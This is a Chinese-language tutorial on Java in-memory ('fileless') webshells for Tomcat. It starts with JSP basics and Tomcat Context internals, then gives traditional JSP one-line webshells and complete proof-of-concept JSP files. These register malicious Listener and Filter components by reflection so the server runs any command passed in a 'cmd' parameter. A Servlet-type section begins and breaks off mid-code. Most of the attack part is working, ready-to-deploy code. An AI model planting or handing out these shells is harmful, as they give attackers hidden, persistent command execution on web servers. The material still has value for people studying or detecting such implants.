---
title: JAVA内存马研究0到1
---

# JAVA内存马研究0到1
# 1、JSP技术

## 1.1、什么是JSP

`JSP`（`Java Server Pages`），是`Java`的一种动态网页技术。在早期`Java`的开发技术中，`Java`程序员如果想要向浏览器输出一些数据，就必须得手动`println`一行行的`HTML`代码。为了解决这一繁琐的问题，`Java`开发了`JSP`技术。
`JSP`可以看作一个`Java Servlet`，主要用于实现`Java web`应用程序的用户界面部分。网页开发者们通过结合`HTML`代码、`XHTML`代码、`XML`元素以及嵌入`JSP`操作和命令来编写`JSP`。
当第一次访问`JSP`页面时，`Tomcat`服务器会将`JSP`页面翻译成一个java`文件`，并将其编译为`.class`文件。`JSP`通过网页表单获取用户输入数据、访问数据库及其他数据源，然后动态地创建网页。

## 1.2、JSP的语法

脚本程序可以包含任意量的`Java`语句、变量、方法或表达式，只要它们在脚本语言中是有效的。脚本程序的格式如下

```java
<% 代码片段 %>
```

其等价于下面的XML语句

```
<jsp:scriptlet>
   代码片段
</jsp:scriptlet>
```

使用实例

```java
<html>
<body>
<meta charset="UTF-8">
<h2>Hello World!</h2>
<% out.print("我是JSP"); %>
</body>
</html>
```

![image.png](https://ckcsec.oss-cn-hangzhou.aliyuncs.com/img/1712565003998-e039e175-37c6-4b39-a684-5c7b89074f16.png)

### 1.2.1、JSP声明

一个声明语句可以声明一个或多个变量、方法，供后面的Java代码使用。JSP声明语句格式如下

```java
<%! 声明  %>
```

同样等价于下面的XML语句

```
<jsp:declaration>
   代码片段
</jsp:declaration>
```

使用实例

```java
<html>
<body>
<meta charset="UTF-8">
<h2>Hello World!</h2>
<%! String name = "YunShan";  %>
<%  out.print(name); %>
</body>
</html>
```

![image.png](https://ckcsec.oss-cn-hangzhou.aliyuncs.com/img/1712565153195-0c2caa6c-bd2b-4faf-9507-f165fdc73318-20240628122954518.png)

### 1.2.2、JSP表达式

如果`JSP`表达式中为一个对象，则会自动调用其`toString()`方法。格式如下，注意表达式后没有`;`

```java
<%= 表达式  %>
```

等价于下面的XML表达式

```
<jsp:expression>
   表达式
</jsp:expression>
```

使用实例

```java
<html>
<body>
<meta charset="UTF-8">
<h2>Hello World!</h2>
<%! String name = "YunShan";  %>
<%= name %>
</body>
</html>
```

![image.png](https://ckcsec.oss-cn-hangzhou.aliyuncs.com/img/1712565153195-0c2caa6c-bd2b-4faf-9507-f165fdc73318-20240628122954518.png)

### 1.2.3、JSP指令

JSP指令用来设置与整个JSP页面相关的属性。下面有三种JSP指令
![image.png](https://ckcsec.oss-cn-hangzhou.aliyuncs.com/img/1712565850920-e7ab7b95-6c54-434e-ac2e-64552c01bcad.png)
比如我们能通过page指令来设置jsp页面的编码格式

```java
<%@ page language="java" contentType="text/html; charset=UTF-8" pageEncoding="UTF-8"%>
```

### 1.2.4、JSP注释

```java
<%-- 注释内容 --%>
```

### 1.2.5、JSP内置对象

`JSP`有九大内置对象，他们能够在客户端和服务器端交互的过程中分别完成不同的功能。其特点如下

- 由 `JSP` 规范提供，不用编写者实例化
- 通过 `Web` 容器实现和管理
- 所有 `JSP` 页面均可使用
- 只有在脚本元素的表达式或代码段中才能使用

![image.png](https://ckcsec.oss-cn-hangzhou.aliyuncs.com/img/1712623226685-a44c4825-ed6b-4ee9-adeb-403314ff0b27.png)

# 2、JAVA木马

传统的`JSP`木马实现

```java
<% Runtime.getRuntime().exec(request.getParameter("cmd"));%>
```

上面是最简单的一句话木马，没有回显，适合用来反弹`shell`。下面是一个带回显的`JSP`木马

```java
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<% if(request.getParameter("cmd")!=null){
    java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream();
 
    BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(in));
    String line;
    PrintWriter printWriter = response.getWriter();
    printWriter.write("<pre>");
    while ((line = bufferedReader.readLine()) != null){
        printWriter.println(line);
    }
    printWriter.write("</pre>");
 
}
%>
```

传统的JSP木马特征性强，且需要文件落地，容易被查杀。因此现在出现了内存马技术。`Java`内存马又称”无文件马”，相较于传统的`JSP`木马，其最大的特点就是无文件落地，存在于内存之中，隐蔽性强。
`Java`内存马按照实现原理大致可以分为如下两种

- 利用`Java Web`组件：动态添加恶意组件，如`Servlet`、`Filter`、`Listener`等。在`Spring`框架下就是`Controller`、`Intercepter`。
- 修改字节码：利用`Java`的`Instrument`机制，动态注入`Agent`，在`Java`内存中动态修改字节码，在HTTP请求执行路径中的类中添加恶意代码，可以实现根据请求的参数执行任意代码。

# 3、Tomcat中的三种Context

我们下面在学习内存马的时候，常常会碰见`ServletContext`、`ApplicationContext`、`StandardContext`这三种`Context`。下面我就来捋一捋各`Context`之间的关系。不过在开始之前，你最好先简单了解一下`Tomcat`的架构
[Tomcat架构解析](https://www.yuque.com/exmmmys/wnuua5/navlga3lr8rqlnaa?view=doc_embed)

## 3.1、Context

在`Tomcat`中，`Context`是`Container`组件的一种子容器，其对应的是一个`Web`应用。`Context`中可以包含多个`Wrapper`容器，而`Wrapper`对应的是一个具体的`Servlet`定义。因此`Context`可以用来保存一个`Web`应用中多个`Servlet`的上下文信息。
![image.png](https://ckcsec.oss-cn-hangzhou.aliyuncs.com/img/1712623582140-fe0fd2ba-990e-42a8-97a6-bcf0be8df428.png)

## 3.2、ServletContext

`Servlet`规范中规定了一个`ServletContext`接口，其用来保存一个`Web`应用中所有`Servlet`的上下文信息，可以通过`ServletContext`来对某个`Web`应用的资源进行访问和操作。其在`Java`中的具体实现是`javax.servlet.ServletContext`接口
![image.png](https://ckcsec.oss-cn-hangzhou.aliyuncs.com/img/1712623766882-f77f3e96-b322-474d-9807-d72fcfd9d5b9.png)

## 3.3、ApplicationContext

在`Tomcat`中，`ServletContext`接口的具体实现就是`ApplicationContext`类，其实现了`ServletContext`接口中定义的一些方法。

`Tomcat`这里使用了[门面模式](https://www.runoob.com/w3cnote/facade-pattern-3.html)，对`ApplicationContext`类进行了封装，我们调用`getServletContext()`方法获得的其实是`ApplicationContextFacade`类

```java
public ApplicationContextFacade(ApplicationContext context) {
        super();
        this.context = context;
 
        classCache = new HashMap<>();
        objectCache = new ConcurrentHashMap<>();
        initClassCache();
    }
```

`ApplicationContextFacade`类方法中都会调用`this.context`相应的方法，因此最终调用的还是`ApplicationContext`类的方法。

## 3.4、StandardContext

`org.apache.catalina.core.StandardContext`是子容器`Context`的标准实现类，其中包含了对`Context`子容器中资源的各种操作。四种子容器都有其对应的标准实现如下
![image.png](https://ckcsec.oss-cn-hangzhou.aliyuncs.com/img/1712624896519-849a21d0-6ef5-4171-9557-aa10ada3f4bd-20240628123109345.png)
而在`ApplicationContext`类中，对资源的各种操作实际上是调用了`StandardContext`中的方法
![image.png](https://ckcsec.oss-cn-hangzhou.aliyuncs.com/img/1712624911163-23e3c0a8-8c69-4bf1-adf0-a65e6b67e13a.png)

```java
...
@Override
    public String getRequestCharacterEncoding() {
        return context.getRequestCharacterEncoding();
    }
...
```

## 3.5、总结

我们可以用一张图来表示各`Context`的关系
![image.png](https://ckcsec.oss-cn-hangzhou.aliyuncs.com/img/1712624911163-23e3c0a8-8c69-4bf1-adf0-a65e6b67e13a.png)

`ServletContext`接口的实现类为`ApplicationContext`类和`ApplicationContextFacade`类，其中`ApplicationContextFacade`是对`ApplicationContext`类的包装。我们对`Context`容器中各种资源进行操作时，最终调用的还是`StandardContext`中的方法，因此`StandardContext`是`Tomcat`中负责与底层交互的`Context`。

# 4、Tomcat内存马

Tomcat内存马大致可以分为三类，分别是`Listener`型、`Filter`型、`Servlet`型。可能有些朋友会发现，这不正是`Java Web`核心的三大组件嘛！没错，`Tomcat`内存马的核心原理就是动态地将恶意组件添加到正在运行的`Tomcat`服务器中。

而这一技术的实现有赖于官方对`Servlet3.0`的升级，`Servlet`在`3.0`版本之后能够支持动态注册组件。而`Tomcat`直到`7.x`才支持`Servlet3.0`，因此通过动态添加恶意组件注入内存马的方式适合`Tomcat7.x`及以上。为了便于调试`Tomcat`，我们先在父项目的`pom`文件中引入`Tomcat`依赖

```xml
<dependency>
  <groupId>org.apache.tomcat</groupId>
  <artifactId>tomcat-catalina</artifactId>
  <version>8.5.31</version>
</dependency>
```

## 4.1、Listener型

根据以上思路，我们的目标就是在服务器中动态注册一个恶意的Listener。而Listener根据事件源的不同，大致可以分为如下三种

- `ServletContextListener`
- `HttpSessionListener`
- `ServletRequestListener`

很明显，`ServletRequestListener`是最适合用来作为内存马的。因为`ServletRequestListener`是用来监听`ServletRequest`对象的，当我们访问任意资源时，都会触发`ServletRequestListener#requestInitialized()`方法。下面我们来实现一个恶意的`Listener`

```java
package com.ma.ListenMa;

import javax.servlet.ServletRequestEvent;
import javax.servlet.ServletRequestListener;
import javax.servlet.annotation.WebListener;
import javax.servlet.http.HttpServletRequest;
import java.io.IOException;


@WebListener
public class ListenerMa1 implements ServletRequestListener {

    @Override
    public void requestDestroyed(ServletRequestEvent sre) {

    }

    @Override
    public void requestInitialized(ServletRequestEvent sre) {
        HttpServletRequest request = (HttpServletRequest) sre.getServletRequest();
        String cmd = request.getParameter("cmd");
        System.out.println(cmd);
        if (cmd != null) {
            try {
                Runtime.getRuntime().exec(cmd);
            } catch (IOException e) {
                e.printStackTrace();
            } catch (NullPointerException n) {
                n.printStackTrace();
            }
        }
    }
}
```

![image.png](https://ckcsec.oss-cn-hangzhou.aliyuncs.com/img/1712625899512-60e37c4f-8ab7-4bc4-98c1-430373844e37.png)

### 4.1.1、Listener的创建过程

开启Debug我们看调用栈
![image.png](https://ckcsec.oss-cn-hangzhou.aliyuncs.com/img/1712626094628-8c950544-d0be-4a82-90e2-b22816311902.png)
`StandardContext#fireRequestInitEvent`调用了我们的`Listener`，我们跟进看其实现

```java
public boolean fireRequestInitEvent(ServletRequest request) {
        Object[] instances = this.getApplicationEventListeners();
        if (instances != null && instances.length > 0) {
            ServletRequestEvent event = new ServletRequestEvent(this.getServletContext(), request);

            for(int i = 0; i < instances.length; ++i) {
                if (instances[i] != null && instances[i] instanceof ServletRequestListener) {
                    ServletRequestListener listener = (ServletRequestListener)instances[i];

                    try {
                        listener.requestInitialized(event);
                    } catch (Throwable var7) {
                        ExceptionUtils.handleThrowable(var7);
                        this.getLogger().error(sm.getString("standardContext.requestListener.requestInit", new Object[]{instances[i].getClass().getName()}), var7);
                        request.setAttribute("javax.servlet.error.exception", var7);
                        return false;
                    }
                }
            }
        }

        return true;
    }
```

关键代码有两处，首先通过`getApplicationEventListeners()`获取一个`Listener`数组，然后遍历数组调用`listener.requestInitialized(event)`方法触发`Listener`。跟进`getApplicationEventListeners()`方法
![image.png](https://ckcsec.oss-cn-hangzhou.aliyuncs.com/img/1712626440436-d8b1fe6c-17e0-479e-8209-17df966eeb10.png)
可以看到`Listener`实际上是存储在`applicationEventListenersList`属性中的
并且我们可以通过`StandardContext#addApplicationEventListener()`方法来添加`Listener`
![image.png](https://ckcsec.oss-cn-hangzhou.aliyuncs.com/img/1712626559727-33a25ce5-57bb-48a1-a036-36face2594ee.png)

### 4.1.2、获取StandardContext类

下面的工作就是获取`StandardContext`类了，在`StandardHostValve#invoke`中，可以看到其通过`request`对象来获取`StandardContext`类
![image.png](https://ckcsec.oss-cn-hangzhou.aliyuncs.com/img/1712626688068-d20fa230-34df-4491-8bdb-1a54e794a560.png)
同样地，由于`JSP`内置了`request`对象，我们也可以使用同样的方式来获取

```java
<%
Field reqF = request.getClass().getDeclaredField("request");
reqF.setAccessible(true);
Request req = (Request) reqF.get(request);
StandardContext context = (StandardContext) req.getContext();
%>
```

另外一种获取方式	——通过线程

```java
<%
WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
StandardContext standardContext = (StandardContext) webappClassLoaderBase.getResources().getContext();
%>
```

接着我们编写一个恶意的`Listener`

```java
<%!
  public class MaListener implements ServletContextListener {

    @Override
    public void contextInitialized(ServletContextEvent sre) {
      HttpServletRequest request = (HttpServletRequest) sre.getServletRequest();
      String cmd = request.getParameter("cmd");
      if (cmd != null) {
        try {
          Runtime.getRuntime().exec(cmd);
        } catch (IOException e) {
          e.printStackTrace();
        } catch (NullPointerException n) {
          n.printStackTrace();
        }
      }
    }

    @Override
    public void contextDestroyed(ServletContextEvent sce) {

    }
  }
%>
```

最后添加监听器

```java
<%
  MaListener maListener = new MaListener();
  standardContext.addApplicationEventListener(maListener);
%>
```

### 4.1.3、完整POC

至此我们可以总结出`Listener`型内存马的实现步骤

1. 获取`StandardContext`上下文
2. 实现一个恶意`Listener`
3. 通过`StandardContext#addApplicationEventListener`方法添加恶意`Listener`

```java
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="java.io.IOException" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="org.apache.catalina.connector.Request" %>
 
<%!
    public class Shell_Listener implements ServletRequestListener {
 
        public void requestInitialized(ServletRequestEvent sre) {
            HttpServletRequest request = (HttpServletRequest) sre.getServletRequest();
           String cmd = request.getParameter("cmd");
           if (cmd != null) {
               try {
                   Runtime.getRuntime().exec(cmd);
               } catch (IOException e) {
                   e.printStackTrace();
               } catch (NullPointerException n) {
                   n.printStackTrace();
               }
            }
        }
 
        public void requestDestroyed(ServletRequestEvent sre) {
        }
    }
%>
<%
    Field reqF = request.getClass().getDeclaredField("request");
    reqF.setAccessible(true);
    Request req = (Request) reqF.get(request);
    StandardContext context = (StandardContext) req.getContext();
 
    Shell_Listener shell_Listener = new Shell_Listener();
    context.addApplicationEventListener(shell_Listener);
%>
```

![image.png](https://ckcsec.oss-cn-hangzhou.aliyuncs.com/img/1712628253152-c4f9d6b0-b452-4417-8726-458d57f4f7c4.png)

## 4.2、Filter型

仿照`Listener`型内存马的实现思路，我们同样能实现`Filter`型内存马。我们知道，在`Servlet`容器中，`Filter`的调用是通过`FilterChain`实现的
![image.png](https://cdn.nlark.com/yuque/0/2024/png/25404035/1712628303549-3ef34696-10c8-4804-95b2-f43a0f118634.png#averageHue=%23ededed&clientId=u8763c45e-e621-4&from=paste&height=421&id=uea26a89e&originHeight=842&originWidth=2882&originalType=binary&ratio=2&rotation=0&showTitle=false&size=165127&status=done&style=none&taskId=u05472da3-82c1-4eb3-aa9b-77d995ccf1f&title=&width=1441)
先来实现一个恶意的Filter

```java
package com.ma.FilterMa;

import javax.servlet.*;
import javax.servlet.annotation.WebFilter;
import java.io.IOException;

@WebFilter("/*")
public class FilterMa1 implements Filter {

    @Override
    public void init(FilterConfig filterConfig) throws ServletException {

    }

    @Override
    public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException {
        String cmd = request.getParameter("cmd");
        System.out.println("FilterMa1触发: " + cmd);
        if (cmd != null) {
            try {
                Runtime.getRuntime().exec(cmd);
            } catch (IOException e) {
                e.printStackTrace();
            } catch (NullPointerException n) {
                n.printStackTrace();
            }
        }
        chain.doFilter(request, response);
    }

    @Override
    public void destroy() {

    }
}

```

![image.png](https://ckcsec.oss-cn-hangzhou.aliyuncs.com/img/1712628888418-ae8f22f9-5a39-4ad3-b72b-89f01bc253da.png)

### 4.2.1、Filter调用分析

我们在`doFilter`处打上断点，调用栈如下
![image.png](https://ckcsec.oss-cn-hangzhou.aliyuncs.com/img/1712628981531-8d1eb2e8-7429-4e8b-8c35-1b3aa41c7404.png)

```java
doFilter:11, Shell_Filter (Filter)
internalDoFilter:189, ApplicationFilterChain (org.apache.catalina.core)
doFilter:162, ApplicationFilterChain (org.apache.catalina.core)
invoke:197, StandardWrapperValve (org.apache.catalina.core)
invoke:97, StandardContextValve (org.apache.catalina.core)
invoke:540, AuthenticatorBase (org.apache.catalina.authenticator)
invoke:135, StandardHostValve (org.apache.catalina.core)
invoke:92, ErrorReportValve (org.apache.catalina.valves)
invoke:687, AbstractAccessLogValve (org.apache.catalina.valves)
invoke:78, StandardEngineValve (org.apache.catalina.core)
service:357, CoyoteAdapter (org.apache.catalina.connector)
service:382, Http11Processor (org.apache.coyote.http11)
process:65, AbstractProcessorLight (org.apache.coyote)
process:895, AbstractProtocol$ConnectionHandler (org.apache.coyote)
doRun:1722, NioEndpoint$SocketProcessor (org.apache.tomcat.util.net)
run:49, SocketProcessorBase (org.apache.tomcat.util.net)
runWorker:1191, ThreadPoolExecutor (org.apache.tomcat.util.threads)
run:659, ThreadPoolExecutor$Worker (org.apache.tomcat.util.threads)
run:61, TaskThread$WrappingRunnable (org.apache.tomcat.util.threads)
run:748, Thread (java.lang)
```

跟进`ApplicationFilterChain#internalDoFilter`

```java
private void internalDoFilter(ServletRequest request,
                                  ServletResponse response)
        throws IOException, ServletException {
 
        // Call the next filter if there is one
        if (pos < n) {
            ApplicationFilterConfig filterConfig = filters[pos++];
            try {
                Filter filter = filterConfig.getFilter();
 
                if (request.isAsyncSupported() && "false".equalsIgnoreCase(
                        filterConfig.getFilterDef().getAsyncSupported())) {
                    request.setAttribute(Globals.ASYNC_SUPPORTED_ATTR, Boolean.FALSE);
                }
                if( Globals.IS_SECURITY_ENABLED ) {
                    final ServletRequest req = request;
                    final ServletResponse res = response;
                    Principal principal =
                        ((HttpServletRequest) req).getUserPrincipal();
 
                    Object[] args = new Object[]{req, res, this};
                    SecurityUtil.doAsPrivilege ("doFilter", filter, classType, args, principal);
                } else {
                    filter.doFilter(request, response, this);
                }
            } 
...
    }
```

调用了`filter.doFilter()`，而`filter`是通过`filterConfig.getFilter()`得到的，`filterConfig`定义如下

```java
private ApplicationFilterConfig[] filters = new ApplicationFilterConfig[0];
 
...
ApplicationFilterConfig filterConfig = filters[pos++]
```

我们知道，一个`filterConfig`对应一个`Filter`，用于存储`Filter`的上下文信息。这里的`filters`属性是一个`ApplicationFilterConfig`数组。我们来寻找一下`ApplicationFilterChain.filters`属性在哪里被赋值。

在`StandardWrapperValve#invoke()`方法中，通过`ApplicationFilterFactory.createFilterChain()`方法初始化了一个`ApplicationFilterChain`类

```java
request.setAttribute("org.apache.catalina.core.DISPATCHER_TYPE", dispatcherType);
request.setAttribute("org.apache.catalina.core.DISPATCHER_REQUEST_PATH", requestPathMB);
ApplicationFilterChain filterChain = ApplicationFilterFactory.createFilterChain(request, wrapper, servlet);
```

跟进`createFilterChain`

```java
public static ApplicationFilterChain createFilterChain(ServletRequest request,
            Wrapper wrapper, Servlet servlet) {
 
        ...
        // Request dispatcher in use
        filterChain = new ApplicationFilterChain();
 
        filterChain.setServlet(servlet);
        filterChain.setServletSupportsAsync(wrapper.isAsyncSupported());
 
        // Acquire the filter mappings for this Context
        StandardContext context = (StandardContext) wrapper.getParent();
        FilterMap filterMaps[] = context.findFilterMaps();
 
        ...
 
        String servletName = wrapper.getName();
 
        // Add the relevant path-mapped filters to this filter chain
        for (FilterMap filterMap : filterMaps) {
            
            ...
            ApplicationFilterConfig filterConfig = (ApplicationFilterConfig)
                    context.findFilterConfig(filterMap.getFilterName());
            ...
 
            filterChain.addFilter(filterConfig);
        }
 
        ...
 
        // Return the completed filter chain
        return filterChain;
    }
```

这里我省略了函数中一些不重要的判断，从`createFilterChain`函数中，我们能够清晰地看到`filterChain`对象的创建过程

1. 首先通过`filterChain = new ApplicationFilterChain()`创建一个空的`filterChain`对象
2. 然后通过`wrapper.getParent()`函数来获取`StandardContext`对象
3. 接着获取`StandardContext`中的`FilterMaps`对象，`FilterMaps`对象中存储的是各`Filter`的名称路径等信息
4. 最后根据`Filter`的名称，在`StandardContext`中获取`FilterConfig`
5. 通过`filterChain.addFilter(filterConfig)`将一个`filterConfig`添加到`filterChain`中

可以看到在`ApplicationFilterChain#addFilter`方法，`filterConfig`被添加到`filters`中

```java
void addFilter(ApplicationFilterConfig filterConfig) {
 
        // Prevent the same filter being added multiple times
        for(ApplicationFilterConfig filter:filters) {
            if(filter==filterConfig) {
                return;
            }
        }
 
        if (n == filters.length) {
            ApplicationFilterConfig[] newFilters =
                new ApplicationFilterConfig[n + INCREMENT];
            System.arraycopy(filters, 0, newFilters, 0, n);
            filters = newFilters;
        }
        filters[n++] = filterConfig;
 
    }
```

所以关键就是将恶意`Filter`的信息添加进`FilterConfig`数组中，这样`Tomcat`在启动时就会自动初始化我们的恶意`Filter`。

### 4.2.2、FilterConfig、FilterDef和FilterMaps

跟进到`createFilterChain`函数中，我们能看到此时的上下文对象`StandardContext`实际上是包含了这三者的
![image.png](https://ckcsec.oss-cn-hangzhou.aliyuncs.com/img/1712630578342-b668ba48-c86f-460b-9ef9-006b91aa5f8e.png)

#### 4.2.2.1、FilterConfig

其中`filterConfigs`包含了当前的上下文信息`StandardContext`、以及`filterDef`等信息
调试太难定位了 用别人的
![image.png](https://ckcsec.oss-cn-hangzhou.aliyuncs.com/img/1712630877308-034ccf0a-4a81-4372-8626-3f8fe1fe749c.png)
其中`filterDef`存放了`filter`的定义，包括`filterClass`、`filterName`等信息。对应的其实就是`web.xml`中的`<filter`>标签。
![image.png](https://ckcsec.oss-cn-hangzhou.aliyuncs.com/img/1712630917582-e29e6e7a-2703-4142-8a95-7ceac34adbad-20240628123252190.png)

```xml
<filter>
    <filter-name></filter-name>
    <filter-class></filter-class>
</filter>
```

可以看到，`filterDef`必要的属性为`filter`、`filterClass`以及`filterName`。

#### 4.2.2.2、FilterDefs

`filterDefs`是一个`HashMap`，以键值对的形式存储`filterDef`
![image.png](https://ckcsec.oss-cn-hangzhou.aliyuncs.com/img/1712630917582-e29e6e7a-2703-4142-8a95-7ceac34adbad-20240628123252190.png)

#### 4.2.2.3、FilterMaps

`filterMaps`中以`array`的形式存放各`filter`的路径映射信息，其对应的是`web.xml`中的`<filter-mapping>`标签
![image.png](https://ckcsec.oss-cn-hangzhou.aliyuncs.com/img/1712631009884-0d604604-756b-42f1-96dd-307604553f97.png)

```xml
<filter-mapping>
    <filter-name></filter-name>
    <url-pattern></url-pattern>
</filter-mapping>
```

`filterMaps`必要的属性为`dispatcherMapping`、`filterName`、`urlPatterns`
于是下面的工作就是构造含有恶意`filter`的`FilterMaps`和`FilterConfig`对象，并将`FilterConfig`添加到`filter`链中了。

### 4.2.3、动态注册Filter

经过上面的分析，我们可以总结出动态添加恶意`Filter`的思路

1. 获取`StandardContext`对象
2. 创建恶意`Filter`
3. 使用`FilterDef`对`Filter`进行封装，并添加必要的属性
4. 创建`filterMap`类，并将路径和`Filtername`绑定，然后将其添加到`filterMaps`中
5. 使用`ApplicationFilterConfig`封装`filterDef`，然后将其添加到`filterConfigs`中

#### 4.2.3.1、获取StandardContext对象

`StandardContext`对象主要用来管理`Web`应用的一些全局资源，如`Session`、`Cookie`、`Servlet`等。因此我们有很多方法来获取`StandardContext`对象。
`Tomcat`在启动时会为每个`Context`都创建个`ServletContext`对象，来表示一个`Context`，从而可以将`ServletContext`转化为`StandardContext`。

```java
//获取ApplicationContextFacade类
ServletContext servletContext = request.getSession().getServletContext();
 
//反射获取ApplicationContextFacade类属性context为ApplicationContext类
Field appContextField = servletContext.getClass().getDeclaredField("context");
appContextField.setAccessible(true);
ApplicationContext applicationContext = (ApplicationContext) appContextField.get(servletContext);
 
//反射获取ApplicationContext类属性context为StandardContext类
Field standardContextField = applicationContext.getClass().getDeclaredField("context");
standardContextField.setAccessible(true);
StandardContext standardContext = (StandardContext) standardContextField.get(applicationContext);
```

#### 4.2.3.2、创建恶意`Filter`

```java
public class Shell_Filter implements Filter {
    
    public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException {
        String cmd=request.getParameter("cmd");
        try {
            Runtime.getRuntime().exec(cmd);
        } catch (IOException e) {
            e.printStackTrace();
        }catch (NullPointerException n){
            n.printStackTrace();
        }
    }
}
```

#### 4.2.3.3、使用`FilterDef`封装

```java
//filter名称
String name = "CommonFilter";
// 创建了一个新的 FilterDef 对象，用于定义过滤器的配置信息，包括过滤器的名称、类和实例等。
FilterDef filterDef = new FilterDef();
// 使用 setFilter() 方法设置过滤器的实例，参数 filter 应该是一个过滤器的实例。
filterDef.setFilter(filter);
// 使用 setFilterName() 方法设置过滤器的名称，参数 name 是之前定义的过滤器名称。
filterDef.setFilterName(name);
// 使用 setFilterClass() 方法设置过滤器的类名，这里通过 filter.getClass().getName() 获取过滤器实例的类名，通常是过滤器类的全限定名。
filterDef.setFilterClass(filter.getClass().getName());
// 最后，通过 addFilterDef() 方法将这个过滤器定义对象添加到指定的 StandardContext 对象中。这个方法用于在容器中注册一个过滤器定义，以便后续可以在部署描述符中配置过滤器映射。
standardContext.addFilterDef(filterDef);
```

#### 4.2.3.4、创建`FilterMap`

`filterMap`用于`filter`和路径的绑定

```java
// 创建了一个新的 FilterMap 对象，用于表示过滤器的映射信息。
// FilterMap 是用来配置过滤器与 URL 匹配模式、调度器类型等信息的类。
FilterMap filterMap = new FilterMap();
// 使用 addURLPattern() 方法向 FilterMap 中添加 URL 匹配模式，这里使用通配符 "/*" 表示匹配所有的 URL。
filterMap.addURLPattern("/*");
// 使用 setFilterName() 方法设置过滤器的名称，参数 name 应该是一个字符串，表示过滤器的名称。
filterMap.setFilterName(name);
// 使用 setDispatcher() 方法设置调度器类型，参数应该是一个字符串，表示调度器的类型。
// 在这里使用了 DispatcherType.REQUEST.name()，表示过滤器将会对请求（REQUEST）进行处理。
filterMap.setDispatcher(DispatcherType.REQUEST.name());
// 最后，通过 addFilterMapBefore() 方法将这个过滤器映射添加到指定的 StandardContext 对象中。
// 这个方法将过滤器映射添加到现有过滤器映射的前面，即在当前过滤器链的最前面添加这个过滤器映射。
standardContext.addFilterMapBefore(filterMap);
```

#### 4.2.3.4、封装`filterConfig`及`filterDef`到`filterConfigs`

```java
// 通过反射获取了 StandardContext 类中名为 "filterConfigs" 的字段，并将其存储在 Configs 变量中。
Field Configs = standardContext.getClass().getDeclaredField("filterConfigs");
// 将 Configs 这个字段对象设为可访问，即使这个字段在正常情况下是私有的，也可以通过反射进行访问。
Configs.setAccessible(true);
// 反射获取了 standardContext 对象中 filterConfigs 字段的值，并将其转换为 Map 类型，存储在 filterConfigs 变量中。
// 这个 filterConfigs 变量应该是一个保存过滤器配置的 Map。
Map filterConfigs = (Map) Configs.get(standardContext);

// 通过反射获取了 ApplicationFilterConfig 类中接受 Context 和 FilterDef 参数的构造函数。
Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class);
// 将 constructor 这个构造函数对象设为可访问，即使这个构造函数在正常情况下是私有的，也可以通过反射进行访问。
constructor.setAccessible(true);
// 反射调用了 constructor 构造函数对象的 newInstance 方法，创建了一个 ApplicationFilterConfig 类型的对象，并将 standardContext 和 filterDef 作为参数传入。
ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext,filterDef);
// 将新创建的 filterConfig 对象以及对应的名称 name 添加到 filterConfigs Map 中，即向 standardContext 中的过滤器配置中添加了一个新的过滤器配置。
filterConfigs.put(name, filterConfig);
```

### 4.2.4、完整POC

```java
<%@ page import="java.io.IOException" %>
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="org.apache.catalina.core.ApplicationContext" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="org.apache.tomcat.util.descriptor.web.FilterDef" %>
<%@ page import="org.apache.tomcat.util.descriptor.web.FilterMap" %>
<%@ page import="java.lang.reflect.Constructor" %>
<%@ page import="org.apache.catalina.core.ApplicationFilterConfig" %>
<%@ page import="org.apache.catalina.Context" %>
<%@ page import="java.util.Map" %>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
 
 
<%
    ServletContext servletContext = request.getSession().getServletContext();
    Field appContextField = servletContext.getClass().getDeclaredField("context");
    appContextField.setAccessible(true);
    ApplicationContext applicationContext = (ApplicationContext) appContextField.get(servletContext);
    Field standardContextField = applicationContext.getClass().getDeclaredField("context");
    standardContextField.setAccessible(true);
    StandardContext standardContext = (StandardContext) standardContextField.get(applicationContext);
%>
 
<%! public class Shell_Filter implements Filter {
        public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException {
            String cmd = request.getParameter("cmd");
            if (cmd != null) {
                try {
                    Runtime.getRuntime().exec(cmd);
                } catch (IOException e) {
                    e.printStackTrace();
                } catch (NullPointerException n) {
                    n.printStackTrace();
                }
            }
            chain.doFilter(request, response);
        }
    }
%>
 
<%
    Shell_Filter filter = new Shell_Filter();
    String name = "CommonFilter";
    FilterDef filterDef = new FilterDef();
    filterDef.setFilter(filter);
    filterDef.setFilterName(name);
    filterDef.setFilterClass(filter.getClass().getName());
    standardContext.addFilterDef(filterDef);
 
 
    FilterMap filterMap = new FilterMap();
    filterMap.addURLPattern("/*");
    filterMap.setFilterName(name);
    filterMap.setDispatcher(DispatcherType.REQUEST.name());
    standardContext.addFilterMapBefore(filterMap);
 
 
    Field Configs = standardContext.getClass().getDeclaredField("filterConfigs");
    Configs.setAccessible(true);
    Map filterConfigs = (Map) Configs.get(standardContext);
 
    Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class);
    constructor.setAccessible(true);
    ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext,filterDef);
    filterConfigs.put(name, filterConfig);
%>
```

![image.png](https://ckcsec.oss-cn-hangzhou.aliyuncs.com/img/1712725948950-4e53e76a-21d8-491c-a2d3-611e4e2e6d71.png)

## 4.3、Servlet型

实现恶意的`Servlet`马

```java
package com.ma.ServletMa;

import javax.servlet.*;
import javax.servlet.annotation.WebServlet;
import java.io.IOException;

@WebServlet("/shell")
public class ServletMa1 implements Servlet {
    @Override
    public void init(ServletConfig config) throws ServletException {

    }

    @Override
    public ServletConfig getServletConfig() {
        return null;
    }

    @Override
    public void service(ServletRequest req, ServletResponse res) throws ServletException, IOException {
        String cmd = req.getParameter("cmd");
        if (cmd !=null){
